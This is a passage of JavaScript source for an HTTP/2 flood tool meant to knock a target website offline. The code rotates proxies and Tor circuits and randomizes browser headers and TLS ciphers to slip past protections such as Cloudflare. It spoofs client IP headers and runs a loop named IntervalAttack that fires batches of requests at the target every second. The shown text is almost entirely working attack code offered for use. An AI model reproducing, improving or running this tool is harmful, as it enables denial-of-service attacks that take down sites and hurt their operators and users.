  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
];

// IP spoofing function
const ip_spoof = () => {
  const ip_segment = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
};

 
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

// Headers will be set after randomHeaders is defined

// This cluster logic is handled in the main execution section above
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

 const Socker = new NetSocket();

// Define missing header arrays
const content_type_header = [
    'text/html; charset=utf-8',
    'application/json',
    'application/x-www-form-urlencoded',
    'text/plain',
    'application/xml',
    'text/xml',
    'application/javascript',
    'text/css'
];

const pragma_header = [
    'no-cache',
    'cache',
    'no-store'
];

const sec_ch_ua_header = [
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    '"Chromium";v="118", "Google Chrome";v="118", "Not?A_Brand";v="99"',
    '"Not_A Brand";v="99", "Chromium";v="121", "Google Chrome";v="121"'
];

const sec_ch_ua_mobile_header = [
    '?0',
    '?1'
];

const sec_ch_ua_platform_header = [
    '"Windows"',
    '"macOS"',
    '"Linux"',
    '"Android"',
    '"iOS"'
];

const sec_fetch_dest_header = [
    'document',
    'empty',
    'object',
    'script',
    'style'
];

const sec_fetch_mode_header = [
    'navigate',
    'cors',
    'no-cors',
    'same-origin'
];

const sec_fetch_site_header = [
    'same-origin',
    'same-site',
    'cross-site',
    'none'
];

const vary_header = [
    'Accept-Encoding',
    'Accept-Language',
    'Origin',
    'User-Agent'
];

const x_download_options_header = [
    'noopen',
    'open'
];

const cross_origin_embedder_policy_header = [
    'require-corp',
    'unsafe-none'
];

const cross_origin_opener_policy_header = [
    'same-origin',
    'same-origin-allow-popups',
    'unsafe-none'
];

const referrer_policy_header = [
    'no-referrer',
    'no-referrer-when-downgrade',
    'origin',
    'origin-when-cross-origin',
    'same-origin',
    'strict-origin',
    'strict-origin-when-cross-origin',
    'unsafe-url'
];

const x_cache_header = [
    'HIT',
    'MISS',
    'BYPASS'
];

const content_security_policy_header = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self'"
];

const x_frame_options_header = [
    'DENY',
    'SAMEORIGIN',
    'ALLOW-FROM'
];

const x_xss_protection_header = [
    '0',
    '1',
    '1; mode=block'
];

const set_cookie_header = [
    'sessionid=abc123; Path=/; HttpOnly',
    'user_pref=1; Path=/; Max-Age=3600',
    'tracking=xyz; Path=/; Domain=.example.com'
];

const server_header = [
    'nginx/1.18.0',
    'Apache/2.4.41',
    'cloudflare',
    'Microsoft-IIS/10.0'
];

const strict_transport_security_header = [
    'max-age=31536000; includeSubDomains',
    'max-age=31536000; includeSubDomains; preload',
    'max-age=63072000; includeSubDomains; preload'
];

const access_control_allow_headers_header = [
    'Content-Type, Authorization',
    'X-Requested-With, Content-Type, Authorization',
    'Origin, X-Requested-With, Content-Type, Accept'
];

const access_control_allow_origin_header = [
    '*',
    'https://example.com',
    'https://*.example.com'
];

const content_encoding_header = [
    'gzip',
    'deflate',
    'br',
    'gzip, deflate, br'
];

const alt_svc_header = [
    'h3=":443"; ma=86400',
    'h3-29=":443"; ma=86400',
    'h3-28=":443"; ma=86400'
];

// Create randomHeaders object with random values from header arrays
const randomHeaders = {
    'Content-Type': content_type_header[Math.floor(Math.random() * content_type_header.length)],
    'x-download-options': x_download_options_header[Math.floor(Math.random() * x_download_options_header.length)],
    'Cross-Origin-Embedder-Policy': cross_origin_embedder_policy_header[Math.floor(Math.random() * cross_origin_embedder_policy_header.length)],
    'Cross-Origin-Opener-Policy': cross_origin_opener_policy_header[Math.floor(Math.random() * cross_origin_opener_policy_header.length)],
    'accept': accept_header[Math.floor(Math.random() * accept_header.length)],
    'accept-language': lang_header[Math.floor(Math.random() * lang_header.length)],
    'Referrer-Policy': referrer_policy_header[Math.floor(Math.random() * referrer_policy_header.length)],
    'x-cache': x_cache_header[Math.floor(Math.random() * x_cache_header.length)],
    'Content-Security-Policy': content_security_policy_header[Math.floor(Math.random() * content_security_policy_header.length)],
    'accept-encoding': encoding_header[Math.floor(Math.random() * encoding_header.length)],
    'cache-control': controle_header[Math.floor(Math.random() * controle_header.length)],
    'x-frame-options': x_frame_options_header[Math.floor(Math.random() * x_frame_options_header.length)],
    'x-xss-protection': x_xss_protection_header[Math.floor(Math.random() * x_xss_protection_header.length)],
    'pragma': pragma_header[Math.floor(Math.random() * pragma_header.length)],
    'sec-ch-ua-platform': sec_ch_ua_platform_header[Math.floor(Math.random() * sec_ch_ua_platform_header.length)],
    'sec-fetch-dest': sec_fetch_dest_header[Math.floor(Math.random() * sec_fetch_dest_header.length)],
    'sec-fetch-mode': sec_fetch_mode_header[Math.floor(Math.random() * sec_fetch_mode_header.length)],
    'sec-fetch-site': sec_fetch_site_header[Math.floor(Math.random() * sec_fetch_site_header.length)],
    'sec-ch-ua': sec_ch_ua_header[Math.floor(Math.random() * sec_ch_ua_header.length)],
    'sec-ch-ua-mobile': sec_ch_ua_mobile_header[Math.floor(Math.random() * sec_ch_ua_mobile_header.length)],
    'vary': vary_header[Math.floor(Math.random() * vary_header.length)],
    'set-cookie': set_cookie_header[Math.floor(Math.random() * set_cookie_header.length)],
    'Server': server_header[Math.floor(Math.random() * server_header.length)],
    'strict-transport-security': strict_transport_security_header[Math.floor(Math.random() * strict_transport_security_header.length)],
    'access-control-allow-headers': access_control_allow_headers_header[Math.floor(Math.random() * access_control_allow_headers_header.length)],
    'access-control-allow-origin': access_control_allow_origin_header[Math.floor(Math.random() * access_control_allow_origin_header.length)],
    'Content-Encoding': content_encoding_header[Math.floor(Math.random() * content_encoding_header.length)],
    'alt-svc': alt_svc_header[Math.floor(Math.random() * alt_svc_header.length)]
};

// Set headers after randomHeaders is available
headers[":method"] = randomMethod;
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept"] = randomHeaders['accept'];
headers["accept-language"] = randomHeaders['accept-language'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["accept-encoding"] = randomHeaders['accept-encoding'];
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = randomHeaders['pragma'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["TE"] = trailers;
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
// headers["Sec-Websocket-Key"] = fakeIP; // Removed - not compatible with HTTP/2
// headers["Sec-Websocket-Version"] = 13; // Removed - not compatible with HTTP/2
// headers["Upgrade"] = websocket; // Removed - not compatible with HTTP/2
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;

 
 function runFlooder() {
    // Rotate Tor circuit if enabled
    if (isTorEnabled) {
        torManager.rotateCircuit();
    }
    
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

   setTimeout(function(){
     process.exit(1);
   }, process.argv[3] * 1000);
   
   process.on('uncaughtException', function(er) {
   });
   process.on('unhandledRejection', function(er) {
   });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
           ALPNProtocols: ['h2'],
           challengesToSolve: Infinity,
           resolveWithFullResponse: true,
           followAllRedirects: true,
           maxRedirects: 10,
           clientTimeout: 5000,
           clientlareMaxTimeout: 10000,
           cloudflareTimeout: 5000,
           cloudflareMaxTimeout: 30000,
           ciphers: tls.getCiphers().join(":") + cipper,
           secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
                       servername: parsedTarget.host,
           socket: connection,
           honorCipherOrder: true,
                       secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
           sigals: concu,
           echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
           secure: true,
           Compression: false,
           rejectUnauthorized: false,
           port: 443,
           uri: parsedTarget.host,
           servername: parsedTarget.host,
           sessionTimeout: 5000,
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        // Use Tor SOCKS agent if enabled, otherwise use direct connection
        const http2Options = {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
        };

        // Add Tor SOCKS agent if enabled
        if (isTorEnabled) {
            const torAgent = torManager.getCurrentAgent();
            if (torAgent) {
                http2Options.agent = torAgent;
            }
        }

        const client = http2.connect(parsedTarget.href, http2Options);

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 20000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
                               for (let i = 0; i < args.rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
       
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
 }


